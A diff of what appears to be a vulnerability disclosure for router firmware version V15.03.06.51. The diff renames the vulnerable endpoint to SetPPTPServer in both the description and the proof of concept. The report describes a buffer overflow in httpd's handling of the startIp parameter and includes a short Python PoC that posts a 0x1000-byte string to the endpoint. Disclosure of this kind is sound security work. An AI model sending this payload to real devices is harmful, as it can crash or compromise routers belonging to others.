@@ -6,7 +6,7 @@ version: V15.03.06.51
 
 ## Description:
 
-There is a buff overflow in httpd/formSetPPTPServer
+There is a buff overflow in httpd/SetPPTPServer
 
 ## Source:
 
@@ -24,7 +24,7 @@ get value from startIp ,then call sprintf, cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetPPTPServer"
+url = "http://192.168.1.13/goform/SetPPTPServer"
 payload = 'A'*0x1000 + '\n'
 
 r = requests.post(url, data={'startIp': payload})
